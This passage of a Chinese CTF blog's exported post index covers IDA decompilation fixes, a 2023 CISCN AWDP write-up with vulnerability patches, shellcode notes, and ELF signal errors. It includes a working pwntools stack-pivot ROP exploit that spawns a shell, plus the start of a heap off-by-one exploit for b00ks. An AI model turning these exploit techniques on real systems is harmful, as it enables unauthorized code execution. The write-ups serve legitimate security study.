class="line">segments：段列表，迭代器。</span><br><span class="line">static_symbols：静态符号列表，迭代器。</span><br><span class="line">strings：字符串列表，迭代器。</span><br><span class="line">symbols：所有符号的列表，迭代器。</span><br><span class="line">imported_functions：导入函数列表，即got表中的函数列表。</span><br></pre></td></tr></table></figure><p>可以直接binary.is_pie这样调用</p><h3 id="修改ELF的symbols"><a href="#修改ELF的symbols" class="headerlink" title="修改ELF的symbols"></a>修改ELF的symbols</h3><h3 id="ELF-Hooking"><a href="#ELF-Hooking" class="headerlink" title="ELF Hooking"></a>ELF Hooking</h3><h3 id="修改got表"><a href="#修改got表" class="headerlink" title="修改got表"></a>修改got表</h3><h1 id="0x3-angr"><a href="#0x3-angr" class="headerlink" title="0x3 angr"></a>0x3 angr</h1>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awdp </tag>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ida伪代码生成失败应对</title>
      <link href="/posts/35200/"/>
      <url>/posts/35200/</url>
      
        <content type="html"><![CDATA[<span class='p red h3'>基本都是堆栈不平衡引起的</span><p>在IDA Pro中,如果返回之前没有清理堆栈分配(平衡堆栈指针)，则反编译器将拒绝反编译该函数.</p><p>参考<a href="https://www.freebuf.com/sectool/156625.html">慎点！来自反编译器的危险 - FreeBuf网络安全行业门户</a></p><h1 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>程序存在一些故意干扰指令</p><p>比如用push(call 本函数内部) + n条指令 + <strong>retn</strong>来实际跳转，而IDA会将这个<strong>retn</strong>认为是整个函数结束</p><p>结果分析后发现调用栈不平衡，因此就提示sp analysis failed.</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>分析干扰指令,并优化</p><h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><p><strong>2023ciscn华东南—colorful</strong></p><p>直接反编译main</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_162711.png" alt=""></p><p><strong>提示我们问题出在1d87处</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_162837.png" alt=""></p><p>标黄的retn被认为是main的结束,但显然不是,因此栈不平衡</p><p>且retn上面的部分都是干扰指令</p><p>那么就要想办法优化这部分指令</p><p>先分析干扰指令</p><ol><li>call loc_1D8F:push rip<strong>(1D8C)</strong>,jmp loc_1D8F</li><li>pop rax:将rax变为1D8C,再跳转</li><li>inc rax:rax加1,成为1D8D,再跳转</li><li>push rax; retn:将rax压入栈,并以此为返回地址</li><li>1D8D处的指令为E8 0D,即<u><strong>jmp 1d8d+D(1d9c)</strong></u></li></ol><p>可以看到这部分代码没有实现任何功能,完全就是干扰</p><p>完全可以优化</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_164306.png" alt=""></p><p><strong>在1d87处直接跳转到1d9c,其余代码全部nop</strong></p><p>之后即可得到伪代码</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>发现干扰指令并优化,去除提前出现的retn等会让ida误解的指令</p><h1 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h1><h2 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h2><p>修正sp值</p><p>保持call或jmp等跳转指令前后栈平衡</p><p>call或jmp等跳转指令前的sp是多少,那么紧接在该指令后的sp也修改为多少</p><h1 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h1><h2 id="解决-2"><a href="#解决-2" class="headerlink" title="解决"></a>解决</h2><p>选中红色代码部分,快捷键p创建函数,该部分即可得到伪代码</p><p>但前面的部分依然不行</p><p>再调整函数开始的sp尝试</p><h1 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h1><h2 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">one_function</span><span class="params">( <span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">another_function</span><span class="params">( <span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( a == <span class="number">0</span> || b == <span class="number">0</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> one_function(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中return one_function(a,b)这条语句，在某些新的编译器，可能会编译成这样的指令序列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">jmp one_funcion</span><br></pre></td></tr></table></figure><p>而IDA是通过retn指令来识别函数的结束的，因为它不知道这里的意思，会把它当成一个函数内部 的跳转，最后就会出现sp analysis failed了。</p><h2 id="解决-3"><a href="#解决-3" class="headerlink" title="解决"></a>解决</h2><p>调整指令</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ciscn华东南赛区</title>
      <link href="/posts/4654/"/>
      <url>/posts/4654/</url>
      
        <content type="html"><![CDATA[<h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-25_225313.png" alt=""></p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>栈溢出,buf的大小是0xf0</p><p>但是读入0x100会造成栈溢出</p><p>patch输入大小为0xf1即可,不晓得为什么0xf0不行</p><h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><p>防御只开了nx和got表保护</p><p>溢出有限</p><p>必然要栈迁移</p><p>然后泄露地址,并再次返回到read数据段处</p><p>然后因为要防止栈越界</p><p>要通过read再次调整栈到高处</p><p>最后getshell</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">lr=<span class="number">0x40136E</span></span><br><span class="line">r=<span class="number">0x40101a</span></span><br><span class="line">bss=<span class="number">0x404060</span></span><br><span class="line">bssplus=bss+<span class="number">0xa00</span></span><br><span class="line">pop_rdi=<span class="number">0x4013d3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4013d1</span></span><br><span class="line">readagain=<span class="number">0x401353</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;175.20.28.11&#x27;,9999)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(bss+<span class="number">0x48</span>)+p64(lr))<span class="comment">#栈迁移</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">9</span>+p64(bss+<span class="number">0x38</span>)<span class="comment">#第二次栈迁移准备,因为可控地区只有这里,只能重新回到这,+0x38防止越界,至于0x38是怎么来的只能靠经验或者调试了</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])<span class="comment">#泄露地址</span></span><br><span class="line">payload+=p64(r)+p64(readagain)<span class="comment">#第二次栈迁移</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets_addr=libc_base+libc.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">7</span>+p64(bssplus)+p64(pop_rdi)<span class="comment">#第三次栈迁移准备</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bssplus)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])<span class="comment">#rdx几乎不会改变,保持之前的0x90,故不用布置     #并read往第三次栈迁移目标方向布置栈</span></span><br><span class="line">payload+=p64(lr)<span class="comment">#第三次栈迁移</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(p64(bssplus)+p64(pop_rdi)+p64(binsh)+p64(r)+p64(system_addr))<span class="comment">#getshell,注意栈对齐</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>主要就是栈迁移,不过为了防止栈越界,不得不做更多的布置</p><h2 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h2><p>gdb和pause组合有时会产生各种各样的牛马问题,二者单独存在问题不大,但一组合就需要谨慎区别了,确认exp无问题就去掉二者,不然exp对了也无法getshell</p><p>又发现,就算二者组合,只要没有在gdb中操控程序则不会出现问题</p><h1 id="houmt"><a href="#houmt" class="headerlink" title="houmt"></a>houmt</h1><h2 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_194639.png" alt=""></p><p>存在uaf漏洞</p><p>添加置0功能,但显然不能在原来的位置,否则会覆盖其他代码</p><p>选择在eh.frame节上增加功能</p><p>首先修改权限,rwx</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_201752.png" alt=""></p><p>之后再eh.frame上找一个合适的位置打上补丁</p><p>同样先调用free,之后再重新获得偏移并寻址置零</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_201911.png" alt=""></p><p>patch成功</p><h2 id="拾遗-1"><a href="#拾遗-1" class="headerlink" title="拾遗"></a>拾遗</h2><p>当要修改的长度大于原有长度时,就需要跳转到别处执行,执行后再返回到原处</p><p>一般选择eh.frame节或者.fini节</p><h1 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h1><h2 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_202925.png" alt=""></p><p>发现,依然存在uaf,free后只是将存储的chunk的大小置零,而并没有将指针置零</p><p>与上一题很像,但据师傅们所说,按照上一题的方法会存在异常</p><p>于是可以利用原语句中将size置零,去掉偏移即是指针置零</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_203321.png" alt=""></p><p>将偏移变为0,patch成功</p><h2 id="拾遗-2"><a href="#拾遗-2" class="headerlink" title="拾遗"></a>拾遗</h2><p>合理利用偏移有时候能达到意想不到的效果</p><h1 id="MaskNote"><a href="#MaskNote" class="headerlink" title="MaskNote"></a>MaskNote</h1><h2 id="patch-3"><a href="#patch-3" class="headerlink" title="patch"></a>patch</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_203629.png" alt=""></p><p>连接字符串长度超过其原有长度</p><p>修改<br><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_204812.png" alt=""></p><p>patch成功</p><h1 id="总拾遗"><a href="#总拾遗" class="headerlink" title="总拾遗"></a>总拾遗</h1>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awdp </tag>
            
            <tag> 线下赛 </tag>
            
            <tag> patch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/posts/46563/"/>
      <url>/posts/46563/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CS_learn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcode编写初识</title>
      <link href="/posts/30663/"/>
      <url>/posts/30663/</url>
      
        <content type="html"><![CDATA[<h1 id="基础汇编"><a href="#基础汇编" class="headerlink" title="基础汇编"></a>基础汇编</h1><h2 id="syscall-int-0x80"><a href="#syscall-int-0x80" class="headerlink" title="syscall(~int 0x80)"></a>syscall(~int 0x80)</h2><div class="table-container"><table><thead><tr><th>function</th><th>syscall number x86_32</th><th>syscall number x86_64</th></tr></thead><tbody><tr><td>read</td><td>3</td><td>0</td></tr><tr><td>write</td><td>4</td><td>1</td></tr><tr><td>open</td><td>5</td><td>2</td></tr><tr><td>execve</td><td>11</td><td>59</td></tr></tbody></table></div><h2 id="汇编长度判断"><a href="#汇编长度判断" class="headerlink" title="汇编长度判断"></a>汇编长度判断</h2><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><h4 id="双寄存器"><a href="#双寄存器" class="headerlink" title="双寄存器"></a>双寄存器</h4><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>mov r64,r64</td><td>3</td></tr><tr><td>mov e32,e32</td><td>2</td></tr><tr><td>mov 16,16</td><td>3</td></tr></tbody></table></div><h4 id="单寄存器"><a href="#单寄存器" class="headerlink" title="单寄存器"></a>单寄存器</h4><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>mov  r64,int32</td><td>7</td></tr><tr><td>mov r64,int64</td><td>10</td></tr><tr><td>mov r64,[r64]/mov [r64],r64</td><td>3~4</td></tr><tr><td>mov r64,[r64+0x??]/mov [r64+0x??],r64</td><td>在上基础根据??判断增加</td></tr><tr><td>mov e32,int32</td><td>5</td></tr><tr><td>mov e32,[e32]/mov [e32],e32</td><td>2~3</td></tr><tr><td>mov e32,[e32+0x??]/mov [e32+0x??],e32</td><td>在上基础根据??判断增加</td></tr></tbody></table></div><p><strong>在上基础根据??判断增加</strong>:增加规则,2个十六进制数及以下+1字节;3到8个十六进制数+4字节,再往上+8字节</p><h3 id="push-amp-pop"><a href="#push-amp-pop" class="headerlink" title="push&amp;pop"></a>push&amp;pop</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>push int8</td><td>2</td></tr><tr><td>push int32/int64</td><td>5</td></tr><tr><td>push r64/e32</td><td>1</td></tr><tr><td>pop r64/e32</td><td>1</td></tr><tr><td>pop [r64]</td><td>2~3</td></tr><tr><td>pop [r64+0x??]</td><td>在上基础根据??判断增加</td></tr></tbody></table></div><h3 id="and-amp-or-amp-xor"><a href="#and-amp-or-amp-xor" class="headerlink" title="and&amp;or&amp;xor"></a>and&amp;or&amp;xor</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>and/or r64,r64</td><td>3</td></tr><tr><td>and/or/xor r64,int8/int32/int64</td><td>4/6/10?</td></tr><tr><td>and/or e32,e32</td><td>2</td></tr><tr><td>and/or/xor r64,int8/int32/int64</td><td>3/6/10?</td></tr></tbody></table></div><h3 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>jmp r64</td><td>2</td></tr><tr><td>jmp $+0x??</td><td>视??决定,&gt;=2</td></tr></tbody></table></div><h1 id="shellcraft使用"><a href="#shellcraft使用" class="headerlink" title="shellcraft使用"></a>shellcraft使用</h1><p>pwntools自带的shell生成模块,生成的汇编代码能达到目的,但一般长度较大</p><p>shellcraft.sh()</p><p>shellcraft.read()</p><p>shellcraft.write()</p><p>shellcraft.open()</p><p> 寄存器记得加引号</p><h1 id="手搓"><a href="#手搓" class="headerlink" title="手搓"></a>手搓</h1><p>清零</p><p>syscall</p><p>int 0x80</p><p>参数布置</p><p>等等</p><h1 id="纯可见字符shellcode"><a href="#纯可见字符shellcode" class="headerlink" title="纯可见字符shellcode"></a>纯可见字符shellcode</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>elf常见运行报错</title>
      <link href="/posts/43614/"/>
      <url>/posts/43614/</url>
      
        <content type="html"><![CDATA[<h1 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h1><p><strong>signal: 11</strong></p><p><strong>exit code: 139</strong></p><p><strong>信号名: SIGSEGV</strong></p><p>最常见的一类错误了</p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><ol><li><strong>访问不存在的内存地址</strong></li><li><strong>访问系统保护的内存地址</strong></li><li><strong>对内存地址进行不符合该内存地址权限的操作</strong>,例如读不可读的地址,写不可写的地址,执行不可执行的地址</li><li><strong>内存对齐问题</strong>,经常会遇到类似这样的汇编命令<code>movaps xmmword ptr [r64 + 0x??], xmm0</code>,操作涉及到xmm寄存器,属于SIMD指令,其中movaps会检查[r64 + 0x??]地址<strong>是否16字节对齐</strong>,不对齐则异常,抛出段错误.</li></ol><h1 id="Bus-error"><a href="#Bus-error" class="headerlink" title="Bus error"></a>Bus error</h1><p><strong>signal: 7</strong></p><p><strong>exit code: 135</strong></p><p><strong>信号名: SIGBUS</strong></p><h2 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h2><h3 id="文件映射访问异常"><a href="#文件映射访问异常" class="headerlink" title="文件映射访问异常"></a>文件映射访问异常</h3><p>这是 SIGBUS 在用户态最为常见最容易触发的情况，通常来说根本原因都是进程 mmap 了一个文件后，另外的进程把这个文件截断了，导致 mmap 出来的某些内存页超出文件的实际大小，访问那些超出的内存页就会触发 SIGBUS，具体来说有以下几种场景：</p><ol><li><p>进程 mmap 一个文件后，其它进程 truncate 该文件到更小。</p></li><li><p>动态库更新，直接 cp 覆盖。</p></li><li><p>可执行文件更新，直接 cp 覆盖。</p></li></ol><p>系统读取磁盘文件通常是按页映射到内存，出于效率考虑常常使用 copy on write 机制，所以文件映射之后，如果对应的文件 page 不存在了(truncated），也不见得会马上出问题，只有到访问时才会出错，因此有一定滞后期。</p><h3 id="访问不对齐的内存"><a href="#访问不对齐的内存" class="headerlink" title="访问不对齐的内存"></a>访问不对齐的内存</h3><p>X86 平台上访问不对齐的内存时，默认不会有问题，但用户可以手动设置 EFLAGS 把 CPU 设置为不允许非对齐的内存访问，此时如果出现不对齐的内存访问，SIGBUS 就会抛出。</p><h1 id="错误的系统调用"><a href="#错误的系统调用" class="headerlink" title="错误的系统调用"></a>错误的系统调用</h1><p><strong>signal: 31</strong></p><p><strong>exit code: 159</strong></p><p><strong>信号名: SIGSYS</strong></p><p><strong>常见在开启了seccomp的程序中,当进行了被限制的系统调用时,抛出该错误</strong></p><h1 id="定时器信号"><a href="#定时器信号" class="headerlink" title="定时器信号"></a>定时器信号</h1><p><strong>signal: 14</strong></p><p><strong>exit code: 1</strong>4</p><p><strong>信号名: SIGALRM</strong></p><p><strong>长时间未响应程序时抛出该信号</strong></p><h1 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h1><p><strong>signal: 6</strong></p><p><strong>exit code: 134</strong></p><p><strong>信号名: SIGABRT</strong></p><h2 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h2><ol><li><strong>执行abort函数</strong></li><li>执行assert函数</li><li><strong>double free or corruption (!prev)</strong>,其实就是堆操作错误了,归根结底最后还是由<strong>abort函数触发</strong></li></ol><h1 id="信号表"><a href="#信号表" class="headerlink" title="信号表"></a>信号表</h1><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-05-14_165734.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 报错 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆实操学习笔记</title>
      <link href="/posts/15815/"/>
      <url>/posts/15815/</url>
      
        <content type="html"><![CDATA[<h1 id="题录"><a href="#题录" class="headerlink" title="题录"></a>题录</h1><h2 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h2><p><strong>难度:★★</strong></p><p><strong>核心利用是off-by-one</strong></p><p>使得一个用于管理指针的chunk指向可写区域,进而达到任意写的目的</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">local_path = <span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">io = process(local_path)</span><br><span class="line"><span class="comment"># libc = io.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.binary = local_path</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">option</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(option)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter_author_name</span>(<span class="params">author_name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_sz, name, dscr_sz, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(idx):  <span class="comment">#print功能会打印所有book的信息,需要挑选</span></span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        bookID = <span class="built_in">int</span>(io.recvline()[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        name = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        dscr = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        author = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bookID, name, dscr, author</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">author_name</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    enter_author_name(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by one to leak addr of book1</span></span><br><span class="line">enter_author_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)<span class="comment">#使得在打印book1地址前不会停下</span></span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;64&#x27;</span>, <span class="string">b&#x27;book1&#x27;</span>, <span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)<span class="comment">#这个大小还有一些限制,这样的话刚刚好,否则可能会要填充一些padding</span></span><br><span class="line"></span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">book1_addr = unpack(author1[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak book1_addr:&quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="string">b&#x27;135168&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)<span 